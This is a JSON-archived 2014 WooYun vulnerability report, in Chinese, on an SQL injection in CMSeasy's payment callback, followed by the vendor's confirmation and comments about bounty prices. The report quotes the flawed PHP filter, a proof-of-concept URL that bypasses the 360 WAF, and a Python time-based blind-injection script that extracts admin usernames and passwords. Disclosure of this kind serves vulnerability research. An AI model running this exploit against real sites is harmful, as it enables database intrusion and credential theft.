{"id": 49205, "wybug_id": "wooyun-2014-074669", "wybug_title": "CMSeasy SQL注入漏洞一发（bypass自身与360waf）", "wybug_corp": "cmseasy", "wybug_author": "magerx", "wybug_date": "2014-09-02 15:33", "wybug_open_date": "2014-12-01 15:34", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "10", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["源码审核", "注射漏洞利用技巧", "源码分析"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-09-02：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-09-03：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-09-06：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-10-28：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-11-07：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-11-17：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-12-01：\t细节向公众公开  简要描述： 也不知道重复没有- -! 详细说明：  /lib/default/archive_act.php：\nfunction respond_action() {        include_once ROOT . '/lib/plugins/pay/' . front::$get['code'] . '.php';        $payclassname = front::$get['code'];        $payobj = new $payclassname();        $uri = $_SERVER[\"REQUEST_URI\"];        $__uriget = strstr($uri, '?');        $__uriget = str_replace('?', '', $__uriget);        $__uriget = explode('&', $__uriget);        $_GET = array();        foreach ($__uriget as $key => $val) {            $tmp = explode('=', $val);            $_GET[$tmp[0]] = $tmp[1];            if(preg_match('/\\'|select|union|\"/i', $tmp1)){                exit('非法参数');            }        }        file_put_contents('logs11.txt', var_export($_GET,true));        $status = $payobj->respond();\n由于程序员的失误导致$tmp1的过滤并没有起到作用，同时由于前面会对code进行过滤继续跟到alipay.php:\nfunction respond() {        if (!empty($_POST)) {            foreach($_POST as $key =>$data) {                if(preg_match('/(=|<|>|\\')/', $data)){                    return false;                }                $_GET[$key] = $data;            }        }        $payment  = pay::get_payment($_GET['code']);\n看看get_payment().\npublic static function get_payment($code) {        $where=array();        $where['pay_code']=$code;        $where['enabled']=1;        $payment1=pay::getInstance()->getrows($where);//注入        $payment = $payment1[0];        if ($payment) {            $config_list = unserialize($payment['pay_config']);            foreach ($config_list AS $config) {                $payment[$config['name']] = $config['value'];            }        }        return $payment;    }\n由于cmseasy使用了360防护，但是可以基于白名单绕过，如下poc:\nhttp://localhost/cmseasy/uploads/index.php/?case=file&case=archive&act=respond&code=alipay'\n无法使用\"=\",写个脚本跑一下exp:\nimport urllib2from time import timedef inject(payload):    url = 'http://localhost/cmseasy/uploads/index.php/?case=file&case=archive&act=respond&code=alipay'    req = urllib2.Request(url+payload)    start = time()    response = urllib2.urlopen(req)    end = time()    index = int(end-start)    return indexwordlist = \"123456789:;Abcdefghijklmnopqrstuvwxyz{\"def user_pass():    result = \"\"    for i in range(1,40):        for num in range(len(wordlist)):            word = ord(wordlist[num])            times = inject(\"'/**/and/**/IF(ord(substring((select/**/concat(username,0x3a,password)/**/from/**/cmseasy_user),{0},1))<{1},BENCHMARK(2000000,md5('xxx')),null)/**/and/**/'1\".format(i,word))            if times>1:                print str(i)+'<=========>'+chr(word-1)                result = result+chr(word-1)                break    print 'username:password<=========>'+result\tuser_pass()\n   漏洞证明：  \n\n   修复方案：  完善过滤   版权声明：转载请注明来源 magerx@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：低 漏洞Rank：5  确认时间：2014-09-03 07:15 厂商回复： 感谢 最新状态： 2014-10-14：漏洞已经处理，补丁后续发出。 2014-10-14：希望留下您的联系方式私信我们。  ", "replys": "漏洞评价：\n评论\n     2014-09-02 17:51 |    \t\t进击的zjx \t\t\t( 普通白帽子  |\t\t\t        Rank:295 漏洞数:61        | 工作需要，暂别一段时间)\t\t \n  我去，$$$这是要发啊！    \n     2014-09-02 17:56 |    \t\t′  雨。 \t\t\t( 普通白帽子  |\t\t\t        Rank:1231 漏洞数:190        | Only Code Never Lie To Me.)\t\t \n     我擦  。。。这么快就定价还$$$    \n     2014-09-02 18:22 |    \t\t贫道来自河北 \t\t\t( 普通白帽子  |\t\t\t        Rank:1395 漏洞数:423        | 一个立志要把乌云集市变成零食店的男人)\t\t \n  真是没赶上好时代啊    \n     2014-09-02 19:23 |    \t\tBadCat \t\t\t( 实习白帽子  |\t\t\t        Rank:81 漏洞数:21        | 悲剧的我什么都不会)\t\t \n  NB.... $$$ SO FAST    \n     2014-09-02 19:37 |    \t\t牛肉包子 \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:64        )\t\t \n  $$$简直炫酷    \n     2014-09-02 19:41 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  别刺激哥    \n     2014-09-02 21:04 |    \t\t老笨蛋 \t\t\t( 路人 |\t\t\t        Rank:29 漏洞数:8        | 老笨蛋一个)\t\t \n  @xsser 哥，你刺激大家了。    \n     2014-09-02 21:22 |    \t\tf4ckbaidu \t\t\t( 普通白帽子  |\t\t\t        Rank:182 漏洞数:23        | 开发真是日了狗了)\t\t \n  屌，1w到手了    \n     2014-09-02 21:47 |    \t\tpandas \t\t\t( 普通白帽子  |\t\t\t        Rank:585 漏洞数:58        | 国家一级保护动物)\t\t \n  应该没有1w，cmseasy以前不都是2k么。这次3个$应该是比2k多点，3k、4k的样子，同时是不是意味着漏洞普遍涨价了？    \n     2014-09-02 22:01 |    \t\tzhxs \t\t\t( 实习白帽子  |\t\t\t        Rank:32 漏洞数:19        | Jyhack-TeaM：http://bbs.jyhack.com/)\t\t \n  求科普、、1$是多少钱、、、    \n     2014-09-03 08:48 |    \t\t乐乐、 \t\t\t( 普通白帽子  |\t\t\t        Rank:853 漏洞数:189        )\t\t \n  @zhxs 1$ 200-500 2$ 501-1000 3$1001-N     \n     2014-09-03 10:52 |    \t\t索马里的海贼 \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:24        | http://tieba.baidu.com/f?kw=WOW)\t\t \n  @乐乐、 错了 $ 100-500;$$ 501-2000;$$$2001-∞    \n     2014-09-03 11:29 |    \t\t乐乐、 \t\t\t( 普通白帽子  |\t\t\t        Rank:853 漏洞数:189        )\t\t \n  @索马里的海贼 3$$$ 都2K啦 我一直以为是1K    \n     2014-09-04 19:40 |    \t\tzhxs \t\t\t( 实习白帽子  |\t\t\t        Rank:32 漏洞数:19        | Jyhack-TeaM：http://bbs.jyhack.com/)\t\t \n  @乐乐、 灰常感谢、小菜又长见识了    \n     2014-09-24 22:33 |    \t\tU神 \t\t\t( 核心白帽子 |\t\t\t        Rank:1285 漏洞数:142        | 感谢乌云，知恩不忘，其实我一直都在乌云默...)\t\t \n  这个很不错！    \n     2014-09-27 20:02 |    \t\tmenmen519 \t\t\t( 普通白帽子  |\t\t\t        Rank:762 漏洞数:146        | http://menmen519.blog.sohu.com/)\t\t \n  这个没有我的那个直接啊，我那个报错注入，也不知道是多少    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}